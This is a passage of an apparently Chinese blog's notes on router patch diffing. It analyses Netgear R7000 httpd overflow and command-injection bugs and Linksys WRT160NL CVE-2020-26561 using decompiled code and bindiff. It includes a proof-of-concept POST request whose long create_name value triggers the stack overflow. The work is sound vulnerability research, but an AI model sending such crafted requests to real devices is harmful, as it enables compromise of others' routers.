class="line"></span><br><span class="line"><span class="keyword">ssize_t</span> __<span class="function">fastcall <span class="title">sub_1AD24</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> *a3, <span class="keyword">signed</span> <span class="keyword">int</span> a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v4 = a1;</span><br><span class="line">  <span class="keyword">if</span> ( sub_224B4((<span class="keyword">int</span>)v10, (<span class="keyword">char</span> *)v4, v5, v6, v7) )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __<span class="function">fastcall <span class="title">sub_1AF38</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a1, <span class="keyword">const</span> <span class="keyword">void</span> *a2, <span class="keyword">signed</span> <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> *a5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v11 = <span class="built_in">malloc</span>(v10);</span><br><span class="line">  ptr = v11;</span><br><span class="line">  sub_1AD24((<span class="keyword">const</span> <span class="keyword">char</span> *)ptr, v5, a5, v7);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>综上，可断定sscanf的参数1是用户可控的，产生溢出</p>
<h2 id="4-none"><a href="#4-none" class="headerlink" title="4-none"></a>4-none</h2><blockquote>
<p><a href="https://www.anquanke.com/post/id/208935" target="_blank" rel="noopener">https://www.anquanke.com/post/id/208935</a></p>
<p><a href="https://blog.grimm-co.com/2020/06/soho-device-exploitation.html" target="_blank" rel="noopener">https://blog.grimm-co.com/2020/06/soho-device-exploitation.html</a></p>
<p>尽管路由器可能具有许多值得分析的服务，但Web服务器通常最有可能包含漏洞。在R7000之类的SOHO设备中，Web服务器必须解析来自网络的用户输入，并运行一些复杂的CGI函数，其中要用到这些输入。此外，Web服务器是用C编写的，并且几乎没有经过测试，因此经常容易受到很简单的内存破坏bug的影响。因此，我决定首先分析Web服务器httpd。</p>
<p>由于我们对Web服务器如何（错误地）处理用户输入感兴趣，因此从<code>recv</code>函数着手分析Web服务器。<code>recv</code>函数用于从连接中获取用户输入。因此，通过查看Web服务器中<code>recv</code>函数的引用，我们可以看到用户输入从哪里开始。该Web服务器有两个调用<code>recv</code>的辅助函数，一个用于http解析器中，另一个用于读取发送到oemdns.com的动态DNS请求的响应。我们将重点关注前者，如下面的Hex-Rays反编译结果所示：</p>
<p>调用<code>read_content</code>（调用<code>recv</code>的辅助函数）之后，解析器进行一些错误检查，将接收到的内容与之前接收到的内容拼接在一起，然后在用户输入中查找字符串<code>name=&quot;mtenFWUpload&quot;</code>和”<code>rnrn</code>“。如果用户输入包含这些字符串，则将这些字符串之后的其余用户输入传递给<code>abCheckBoardID</code>函数。在固件的root文件系统上运行grep，我们可以看到字符串<code>mtenFWUpload</code>是从文件<code>www/UPG_upgrade.htm</code>和<code>www/Modem_upgrade.htm</code>中引用的，因此我们可以得出结论，这是路由器升级功能的一部分。</p>
<p>在用户输入之后，我们接下来看<code>abCheckBoardID</code>函数。如下所示，该函数期望用户输入的是R7000的chk固件文件。它解析用户输入以验证魔术值（字节0-3），获取头部大小（字节4-7）和校验和（字节36-49），然后将头部复制到栈上一个缓冲区。复制通过<code>memcpy</code>函数执行，size参数由用户输入中的大小指定。因此，进行栈缓冲区溢出很容易。</p>
</blockquote>
<ol>
<li>Netgear R7000</li>
<li>9.88 vs 11.106（离9.88最近的11.100并未修复</li>
<li>/usr/sbin/httpd</li>
</ol>
<h3 id="bindiff-1"><a href="#bindiff-1" class="headerlink" title="bindiff"></a>bindiff</h3><p>漏洞函数sub_1CDA4</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">0.9013607878154318	0.9884562475160777	</span><br><span class="line">0001CDA4	sub_0001CDA4	Normal	</span><br><span class="line">0001CD74	sub_0001CD74	Normal	</span><br><span class="line">0	9	1	2	11	4</span><br></pre></td></tr></table></figure>
<p>bindiff中，memcpy独立为一个节点，当参数n满足要求时才会去执行</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-12-10-093950.jpg" alt="image-20201210173542421"></p>
<h3 id="成因-1"><a href="#成因-1" class="headerlink" title="成因"></a>成因</h3><p>sub_1CDA4中有2个memcpy，由上图，是memset后的那个</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">sub_1CDA4</span><span class="params">(<span class="keyword">void</span> *src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v1 = (<span class="keyword">const</span> <span class="keyword">char</span> *)src;<span class="comment">//v1来自参数1</span></span><br><span class="line">  v5 = v1[<span class="number">7</span>] + (v1[<span class="number">4</span>] &lt;&lt; <span class="number">24</span>);<span class="comment">//</span></span><br><span class="line">  v6 = v1[<span class="number">6</span>];<span class="comment">//</span></span><br><span class="line">  v7 = v1[<span class="number">5</span>];<span class="comment">//v567都来自v1</span></span><br><span class="line">  v9 = v5 + (v6 &lt;&lt; <span class="number">8</span>) + (v7 &lt;&lt; <span class="number">16</span>);<span class="comment">//v9来自v567</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x64</span>u);<span class="comment">//s目的，大小确定</span></span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;s, v1, v9);<span class="comment">//v1源，v9长度</span></span><br></pre></td></tr></table></figure>
<p>sub_1CDA4的第一个交叉引用：sub_163A4，在固件的root文件系统上运行grep，我们可以看到字符串<code>mtenFWUpload</code>是从文件<code>www/UPG_upgrade.htm</code>和<code>www/Modem_upgrade.htm</code>中引用的，因此我们可以得出结论，这是路由器升级功能的一部分。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v193 = sub_10D64(dword_F42358, src, <span class="number">0x400</span>u);<span class="comment">//93是返回值，注意src为参数，可能为传入参数</span></span><br><span class="line">v192 = v193;<span class="comment">//192来自193</span></span><br><span class="line">v194 = (<span class="keyword">char</span> *)&amp;v290 + v195;<span class="comment">//290同194</span></span><br><span class="line"><span class="built_in">memcpy</span>(v194, src, v192);<span class="comment">//194来自src，长度为192</span></span><br><span class="line">v199 = stristr(&amp;v290, <span class="string">"name=\"mtenFWUpload\""</span>);<span class="comment">//199来自290</span></span><br><span class="line"><span class="keyword">if</span> ( v199 &amp;&amp; (v200 = stristr(v199, <span class="string">"\r\n\r\n"</span>), (v201 = v200) != <span class="number">0</span>) &amp;&amp; v198 )<span class="comment">//201来自200，又来自199</span></span><br><span class="line">&#123;</span><br><span class="line">  v202 = v200 + <span class="number">4</span>;</span><br><span class="line">  v203 = *(_BYTE *)(v200 + <span class="number">11</span>);</span><br><span class="line">  nullsub_1(v200);</span><br><span class="line">  <span class="keyword">if</span> ( sub_1CDA4((<span class="keyword">void</span> *)(v201 + <span class="number">4</span>)) )<span class="comment">//参数1</span></span><br></pre></td></tr></table></figure>
<p>找sub_10D64的参数2，其中调用了recv，原型<code>ssize_t recv(int sockfd, void *buf, size_t len, int flags)</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> __<span class="function">fastcall <span class="title">sub_10D64</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">void</span> *a2, <span class="keyword">size_t</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  result = recv(a1, a2, a3, <span class="number">64</span>);<span class="comment">//从socket中获取用户输入，保存到参数2-buf中</span></span><br><span class="line">  <span class="keyword">return</span> result;<span class="comment">//接收到的长度</span></span><br></pre></td></tr></table></figure>
<p>综上，经过recv，用户的输入最终可到达memcpy，并且源和长度都可控，产生溢出</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">由于我们对Web服务器如何（错误地）处理用户输入感兴趣，因此从`recv`函数着手分析Web服务器。`recv`函数用于从连接中获取用户输入。因此，通过查看Web服务器中`recv`函数的引用，我们可以看到用户输入从哪里开始。该Web服务器有两个调用`recv`的辅助函数，一个用于http解析器中，另一个用于读取发送到oemdns.com的动态DNS请求的响应。重点关注前者</span><br></pre></td></tr></table></figure>
<h2 id="5-none"><a href="#5-none" class="headerlink" title="5-none"></a>5-none</h2><blockquote>
<p><a href="https://www.anquanke.com/post/id/85125v" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85125v</a></p>
<p>这里省略了一部分过程，由于v53的值是OPTIONS，最后会有一处赋值，v34会赋值为v45的地址值，之后就进入漏洞触发的关键位置，这里会调用sprintf将v50，也就是我们命令的值交给v34。而v34的值就是v45地址的值，这样调用system(&amp;45)的时候，就执行了系统命令。</p>
</blockquote>
<ol>
<li>Netgear R7000</li>
<li>72 vs 76</li>
<li>/usr/sbin/httpd</li>
</ol>
<h3 id="bindiff-2"><a href="#bindiff-2" class="headerlink" title="bindiff"></a>bindiff</h3><p>漏洞函数sub_36C34</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">0.9101453893501178	0.9918994703045645	</span><br><span class="line">00036C34	sub_00036C34	Normal	</span><br><span class="line">00036EB4	sub_00036EB4	Normal	</span><br><span class="line">0	90	13	13	122	35</span><br></pre></td></tr></table></figure>
<p>开头多了三个节点123，修改了一个节点4</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-12-11-092318.jpg" alt="image-20201211153746355"></p>
<p>123中多了strchr，4中多了strstr</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-12-11-092320.jpg" alt="image-20201211153555229"></p>
<h3 id="成因-2"><a href="#成因-2" class="headerlink" title="成因"></a>成因</h3><p>（看的修复后的新版本</p>
<p>strchr、strstr过滤的东西与命令执行相关，推测system等的命令注入</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strchr</span>(a3, <span class="string">';'</span>) &amp;&amp; !<span class="built_in">strchr</span>(v6, <span class="string">'`'</span>) &amp;&amp; !<span class="built_in">strchr</span>(v6, <span class="string">'$'</span>) &amp;&amp; !<span class="built_in">strstr</span>(v6, <span class="string">".."</span>) )</span><br></pre></td></tr></table></figure>
<p>system的命令字符串来自sub_36EB4的参数3</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">sub_36EB4</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1, <span class="keyword">int</span> a2, <span class="keyword">const</span> <span class="keyword">char</span> *a3, <span class="keyword">int</span> a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v6 = a3;<span class="comment">//6来自参数3</span></span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strchr</span>(a3, <span class="string">';'</span>)&amp;&amp; !<span class="built_in">strchr</span>(v6, <span class="string">'`'</span>)&amp;&amp; !<span class="built_in">strchr</span>(v6, <span class="string">'$'</span>) &amp;&amp; !<span class="built_in">strstr</span>(v6, <span class="string">".."</span>) )<span class="comment">//过滤敏感字符，命令注入相关</span></span><br><span class="line">  &#123;</span><br><span class="line">      v12 = <span class="built_in">strstr</span>(v6, <span class="string">"cgi-bin"</span>);<span class="comment">//12来自6</span></span><br><span class="line">          v19 = <span class="built_in">strchr</span>(v12, <span class="string">'/'</span>);<span class="comment">//19来自12</span></span><br><span class="line">          v20 = v19 + <span class="number">1</span>;<span class="comment">//20来自19</span></span><br><span class="line">              <span class="built_in">strcpy</span>((<span class="keyword">char</span> *)&amp;v54, v20);<span class="comment">//54来自20</span></span><br><span class="line">              v37 = <span class="string">"/www/cgi-bin/%s &gt; /tmp/cgi_result"</span>;<span class="comment">//37为format参数</span></span><br><span class="line">              v38 = (<span class="keyword">char</span> *)&amp;v49;<span class="comment">//38同49，注意这一点！</span></span><br><span class="line">            <span class="built_in">sprintf</span>(v38, v37, &amp;v54);<span class="comment">//38来自37、54，3个参数分别是str-format-arg，重点看54 </span></span><br><span class="line">            system((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v49);<span class="comment">//49为命令字符串</span></span><br></pre></td></tr></table></figure>
<p>sub_36EB4的参数3来自sub_197B8的参数1</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> *__<span class="function">fastcall <span class="title">sub_197B8</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1, <span class="keyword">const</span> <span class="keyword">char</span> *a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v4 = a1;</span><br><span class="line">    result = (<span class="keyword">char</span> *)sub_36EB4(v3, v5, v4, <span class="number">2</span>);</span><br></pre></td></tr></table></figure>
<p>sub_100A0中，sub_197B8的参数1为v9，可见为url，用户可控</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"\n%s,%d,goto handle_get_post, url=%s\n"</span>, <span class="string">"parse_http_request"</span>, <span class="number">5174</span>, v9); </span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">strncmp</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)v9, <span class="string">"cgi-bin/"</span>, <span class="number">8u</span>) )</span><br><span class="line"><span class="built_in">strstr</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)v9, <span class="string">".htm"</span>)</span><br><span class="line"><span class="keyword">return</span> sub_197B8((<span class="keyword">const</span> <span class="keyword">char</span> *)v9, v263, v4);</span><br></pre></td></tr></table></figure>
<p>综上，url最终变为命令字符串，输入可控，可命令注入</p>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>路由器</tag>
        <tag>漏洞分析</tag>
        <tag>补丁对比</tag>
      </tags>
  </entry>
  <entry>
    <title>补丁对比技术实践-linksys</title>
    <url>/2021/08/26/iot/%E8%A1%A5%E4%B8%81%E5%AF%B9%E6%AF%94%E6%8A%80%E6%9C%AF%E5%AE%9E%E8%B7%B5-linksys/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="00-补丁对比-linksys"><a href="#00-补丁对比-linksys" class="headerlink" title="00-补丁对比-linksys"></a>00-补丁对比-linksys</h1><h2 id="00-pre"><a href="#00-pre" class="headerlink" title="00-pre"></a>00-pre</h2><p><a href="https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=linksys" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=linksys</a></p>
<p><a href="https://www.anquanke.com/vul（搜索linksys挨着看" target="_blank" rel="noopener">https://www.anquanke.com/vul（搜索linksys挨着看</a></p>
<ul>
<li>linksys 固件（三方）：<a href="https://sourceforge.net/projects/officiallinksysfirmware/" target="_blank" rel="noopener">https://sourceforge.net/projects/officiallinksysfirmware/</a></li>
<li>linksys固件（官网2）：<a href="https://www.linksys.com/gb/support-article?articleNum=208638" target="_blank" rel="noopener">https://www.linksys.com/gb/support-article?articleNum=208638</a></li>
</ul>
<h2 id="00-暂搁置"><a href="#00-暂搁置" class="headerlink" title="00-暂搁置"></a>00-暂搁置</h2><ul>
<li>CVE-2018-3953/4/5</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># release信息</span></span><br><span class="line">Firmware 3.0.05 (build 2)</span><br><span class="line">- Addressed multiple OS <span class="built_in">command</span> injection security vulnerabilities (TALOS-2018-0625)</span><br><span class="line"><span class="comment"># 涉及版本</span></span><br><span class="line">Linksys E1200 Firmware Version 2.0.09 Linksys E2500 Firmware Version 3.0.04</span><br><span class="line"><span class="comment"># 找了E2500的3.0.05和3.0.02（其他实在找不到</span></span><br><span class="line">3.0.05：https://www.linksys.com/us/support-article?articleNum=164513</span><br><span class="line">3.0.02：https://www.linksys.com/gb/support-article?articleNum=208638</span><br><span class="line"><span class="comment"># 原文没看懂，且没下到相应版本的固件，暂搁置</span></span><br></pre></td></tr></table></figure>
<h2 id="01-CVE-2020-26561"><a href="#01-CVE-2020-26561" class="headerlink" title="01-CVE-2020-26561"></a>01-CVE-2020-26561</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26561</span></span><br><span class="line"><span class="comment"># WRT160NL、不再提供支持，故未发布补丁</span></span><br><span class="line"><span class="comment"># 栈溢出、sprintf函数、mini_httpd</span></span><br><span class="line"><span class="comment"># 任意代码执行</span></span><br><span class="line">** UNSUPPORTED WHEN ASSIGNED ** Belkin LINKSYS WRT160NL 1.0.04.002_US_20130619 devices have a stack-based buffer overflow vulnerability because of sprintf <span class="keyword">in</span> create_dir <span class="keyword">in</span> mini_httpd. Successful exploitation leads to arbitrary code execution. NOTE: This vulnerability only affects products that are no longer supported by the maintainer.</span><br><span class="line"><span class="comment"># https://research.nccgroup.com/2020/10/20/wrt160nl-cve-2020-26561-bof/</span></span><br><span class="line"><span class="comment"># 需经过认证</span></span><br><span class="line">The mini_httpd binary <span class="keyword">in</span> the firmware version 1.0.04 build 2 of the Linksys WRT160NL uses the insecure <span class="keyword">function</span> sprintf when a specific and authenticated POST request is sent.</span><br></pre></td></tr></table></figure>
<ol>
<li>./usr/sbin/mini_httpd</li>
</ol>
<h3 id="怎么触发"><a href="#怎么触发" class="headerlink" title="怎么触发"></a>怎么触发</h3><p>####触发漏洞的http包</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># apply.cgi</span></span><br><span class="line"><span class="comment"># 带有session_id，需要认证</span></span><br><span class="line"><span class="comment"># 主要是post的数据</span></span><br><span class="line"><span class="comment"># create_name 溢出字段，用户可控</span></span><br><span class="line">POST /apply.cgi;session_id=42ef7c31a24121c858d670e84d0350d9 HTTP/1.1</span><br><span class="line">Host: 192.168.1.1</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8</span><br><span class="line">Accept-Language: en-GB,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 1197</span><br><span class="line">Origin: http://192.168.1.1</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://192.168.1.1/apply.cgi;session_id=d55bad29cf2ca864be41836aa71a3e46</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">submit_button=Disk_Properties&amp;change_action=gozila_cgi&amp;submit_type=create_dir&amp;next_page=Share_Properties.asp&amp;create_name=AAAA...AAAA&amp;share_name=</span><br></pre></td></tr></table></figure>
<h4 id="漏洞函数create-dir"><a href="#漏洞函数create-dir" class="headerlink" title="漏洞函数create_dir"></a>漏洞函数create_dir</h4><ol>
<li>怎么产生漏洞</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">create_dir</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v3[<span class="number">512</span>]; <span class="comment">// 局部数组，栈空间中，大小512定植</span></span><br><span class="line">  v0 = (<span class="keyword">char</span> *)get_cgi((<span class="keyword">int</span>)<span class="string">"create_name"</span>);<span class="comment">//从post数据中获取信息，用户可控（猜出本函数功能</span></span><br><span class="line">  v1 = (<span class="keyword">char</span> *)nvram_get(<span class="string">"dir_list"</span>);<span class="comment">//从配置中获取信息</span></span><br><span class="line">  <span class="built_in">sprintf</span>(v3, <span class="string">"%s/%s"</span>, v1, v0);<span class="comment">// 字符串拼接</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># </span><br><span class="line">  v7 = (<span class="keyword">char</span> *)get_cgi((<span class="keyword">int</span>)<span class="string">"submit_button"</span>);</span><br><span class="line">  v8 = (<span class="keyword">char</span> *)get_cgi((<span class="keyword">int</span>)<span class="string">"submit_type"</span>);</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>结合gozila_cgi、create_dir 以及post数据推断出get_cgi的作用：获取post数据</li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">post数据</span><br><span class="line"><span class="comment">#submit_button=Disk_Properties&amp;change_action=gozila_cgi&amp;submit_type=create_dir&amp;next_page=Share_Properties.asp&amp;create_name=AAAA...AAAA&amp;share_name=</span></span><br><span class="line">gozila_cgi和create_dir伪代码中</span><br><span class="line"><span class="comment"># v7 = (char *)get_cgi((int)"submit_button");</span></span><br><span class="line"><span class="comment"># v8 = (char *)get_cgi((int)"submit_type");</span></span><br><span class="line"><span class="comment"># v0 = (char *)get_cgi((int)"create_name");</span></span><br></pre></td></tr></table></figure>
<h4 id="如何调用漏洞函数"><a href="#如何调用漏洞函数" class="headerlink" title="如何调用漏洞函数"></a>如何调用漏洞函数</h4><ol>
<li>create_dir不是直接call调用的</li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">create_dir函数的xref，只有两个：LOAD和.got，并没有.text中的调用</span><br><span class="line"><span class="comment"># Up	o	LOAD:004043A8	Elf32_Sym &lt;aCreateDir - byte_404698, create_dir, 0xF8, 0x12, 0, 0xA&gt; # "create_dir"</span></span><br><span class="line"><span class="comment"># Down	o	.got:create_dir_ptr	.word create_dir</span></span><br><span class="line">create_dir地址</span><br><span class="line"><span class="comment"># .text:0044A89C                 .globl create_dir</span></span><br><span class="line"><span class="comment"># .text:0044A89C create_dir:                              # DATA XREF: LOAD:004043A8↑o</span></span><br><span class="line"><span class="comment"># .text:0044A89C                                          # .got:create_dir_ptr↓o                            </span></span><br><span class="line">alt+b搜索其地址0044A89C（alt+b二进制，alt+t文本</span><br><span class="line"><span class="comment"># .data:10001EA8                 .byte    0</span></span><br><span class="line"><span class="comment"># .data:10001EA9                 .byte 0x44  # D</span></span><br><span class="line"><span class="comment"># .data:10001EAA                 .byte 0xA8</span></span><br><span class="line"><span class="comment"># .data:10001EAB                 .byte 0x9C</span></span><br><span class="line">10001EA8处快捷键O（O：解释地址为数据段偏移量，用于字符串标号，不太常用</span><br><span class="line"><span class="comment"># .data:10001EA8                 .word 0x44A89C</span></span><br><span class="line"><span class="comment"># .data:10001EA8                 .word create_dir</span></span><br><span class="line">发现其周围全是类似的，应该是某种结构体的数组</span><br><span class="line"><span class="comment"># .data:10001E94                 .word aDiskProperties    # "Disk_Properties"</span></span><br><span class="line"><span class="comment"># .data:10001E98                 .word aCreateDir_0       # "create_dir"</span></span><br><span class="line"><span class="comment"># .data:10001E9C                 .word aSDS_2+8           # ""</span></span><br><span class="line"><span class="comment"># .data:10001EA0                 .word 1</span></span><br><span class="line"><span class="comment"># .data:10001EA4                 .word 4</span></span><br><span class="line"><span class="comment"># .data:10001EA8                 .word create_dir</span></span><br><span class="line">可推断，create_dir不是直接call调用的，而是通过结构体，寻址到某成员再调用的，间接调用</span><br><span class="line">找到结构体数组的首地址（往前翻，直到发现了.globl	</span><br><span class="line"><span class="comment"># .data:1000187C                 .globl gozila_actions</span></span><br><span class="line"><span class="comment"># .data:1000187C gozila_actions: .word aIndex             # DATA XREF: LOAD:00404588↑o</span></span><br><span class="line"><span class="comment"># .data:1000187C                                          # handle_gozila_action+3C↑o ...</span></span><br><span class="line"><span class="comment"># .data:1000187C                                          # "index"</span></span><br><span class="line"><span class="comment"># .data:10001880                 .word aGetCloneMac+4     # "clone_mac"</span></span><br><span class="line"><span class="comment"># .data:10001884                 .word aSDS_2+8           # ""</span></span><br><span class="line"><span class="comment"># .data:10001888                 .word 1</span></span><br><span class="line"><span class="comment"># .data:1000188C                 .word 4</span></span><br><span class="line"><span class="comment"># .data:10001890                 .word clone_mac</span></span><br><span class="line">gozila_actions的xref，找到了handle_gozila_action函数中的调用</span><br><span class="line"><span class="comment"># .text:00415CDC                 la      $s0, gozila_actions</span></span><br><span class="line"><span class="comment"># v1 = (const char **)&amp;gozila_actions;</span></span><br><span class="line">交叉引用handle_gozila_action，找到gozila_cgi函数</span><br><span class="line">根据上下文，可见v7为submit_button，v8为submit_type</span><br><span class="line"><span class="comment">#     v11 = fopen("/dev/console", "w");</span></span><br><span class="line"><span class="comment">#     v12 = v11;</span></span><br><span class="line"><span class="comment">#     if ( v11 )</span></span><br><span class="line"><span class="comment">#     &#123;</span></span><br><span class="line"><span class="comment">#       fprintf(v11, "submit_button=[%s] submit_type=[%s]\n", v7, v8);</span></span><br><span class="line"><span class="comment">#       fclose(v12);</span></span><br><span class="line"><span class="comment">#     &#125;</span></span><br><span class="line"><span class="comment">#     v13 = (struc_gozila_action *)handle_gozila_action(v7, v8);</span></span><br><span class="line">快捷键Y修改 handle_gozila_action 的<span class="built_in">type</span></span><br><span class="line"><span class="comment">#   v1 = (const char **)&amp;gozila_actions;</span></span><br><span class="line"><span class="comment">#   if ( &amp;gozila_actions &gt;= variables )</span></span><br><span class="line"><span class="comment">#     return 0;</span></span><br><span class="line"><span class="comment">#   while ( 1 )</span></span><br><span class="line"><span class="comment">#   &#123;</span></span><br><span class="line"><span class="comment">#     if ( !strcmp(*v1, submit_button) )</span></span><br><span class="line"><span class="comment">#     &#123;</span></span><br><span class="line"><span class="comment">#       v5 = strcmp(v1[1], submit_type) == 0;</span></span><br><span class="line"><span class="comment">#       result = (int)v1;</span></span><br><span class="line"><span class="comment">#       if ( v5 )</span></span><br><span class="line"><span class="comment">#         break;</span></span><br><span class="line"><span class="comment">#     &#125;</span></span><br><span class="line"><span class="comment">#     v1 += 6;</span></span><br><span class="line">触发漏洞的http请求中的post数据：submit_button=Disk_Properties、submit_type=create_dir</span><br><span class="line">v1对应submit_button，v1[1]对应submit_type，<span class="keyword">while</span>循环最后v1 += 6（说明结构体共6个成员</span><br><span class="line">正好对应data中结构体</span><br><span class="line"><span class="comment"># .data:10001E94                 .word aDiskProperties    # "Disk_Properties"</span></span><br><span class="line"><span class="comment"># .data:10001E98                 .word aCreateDir_0       # "create_dir"</span></span><br><span class="line"><span class="comment"># .data:10001E9C                 .word aSDS_2+8           # ""</span></span><br><span class="line"><span class="comment"># .data:10001EA0                 .word 1</span></span><br><span class="line"><span class="comment"># .data:10001EA4                 .word 4</span></span><br><span class="line"><span class="comment"># .data:10001EA8                 .word create_dir</span></span><br></pre></td></tr></table></figure>
<ol start="2">
<li>结构体6个成员分别是什么，怎么调用函数</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">gozila_cgi</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> a5, <span class="keyword">char</span> *a6)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 返回值v13，是指针    </span></span><br><span class="line">    v13 = (struc_gozila_action *)handle_gozila_action(v7, v8);</span><br><span class="line">    <span class="comment">// 根据字符串猜测成员</span></span><br><span class="line">    <span class="comment">// 创建结构体后，汇编中快捷键T后，再F5更新伪代码</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">fprintf</span>(</span><br><span class="line">      v16,</span><br><span class="line">      <span class="string">"name=[%s] type=[%s] service=[%s] sleep=[%d] action=[%d]\n"</span>,</span><br><span class="line">      (<span class="keyword">const</span> <span class="keyword">char</span> *)v13-&gt;name,</span><br><span class="line">      (<span class="keyword">const</span> <span class="keyword">char</span> *)v13-&gt;type,</span><br><span class="line">      (<span class="keyword">const</span> <span class="keyword">char</span> *)v13-&gt;service,</span><br><span class="line">      v13-&gt;sleep,</span><br><span class="line">      v13-&gt;action);</span><br><span class="line">    <span class="comment">// 间接调用函数：通过结构体指针寻找成员（这种形式的调用，xref看不到</span></span><br><span class="line">    v17 = (<span class="keyword">void</span> (__fastcall *)(<span class="keyword">int</span>))v13-&gt;func;</span><br><span class="line">    <span class="keyword">if</span> ( v17 )</span><br><span class="line">      v17(a1);</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>可手动创建结构体，或在data中，选中数据右键，create structure from selection</li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">00000000 struc_gozila_action struc  <span class="comment"># (sizeof=0x18, mappedto_22)</span></span><br><span class="line">00000000 name:           .word ?</span><br><span class="line">00000004 <span class="built_in">type</span>:           .word ?                  <span class="comment"># XREF: gozila_cgi+254/r</span></span><br><span class="line">00000008 service:        .word ?                  <span class="comment"># XREF: gozila_cgi+2A8/r</span></span><br><span class="line">0000000C sleep:          .word ?                  <span class="comment"># XREF: gozila_cgi+25C/r</span></span><br><span class="line">0000000C                                          <span class="comment"># gozila_cgi+2B8/r</span></span><br><span class="line">00000010 action:         .word ?                  <span class="comment"># XREF: gozila_cgi+268/r</span></span><br><span class="line">00000010                                          <span class="comment"># gozila_cgi+2C0/r</span></span><br><span class="line">00000014 func:           .word ?                  <span class="comment"># XREF: gozila_cgi+2B4/r</span></span><br><span class="line">00000018 struc_gozila_action ends</span><br></pre></td></tr></table></figure>
<h4 id="完整流程"><a href="#完整流程" class="headerlink" title="完整流程"></a>完整流程</h4><ol>
<li>handle_gozila_action获取到结构体指针，后面用指针形式获取到create_dir并调用</li>
</ol>
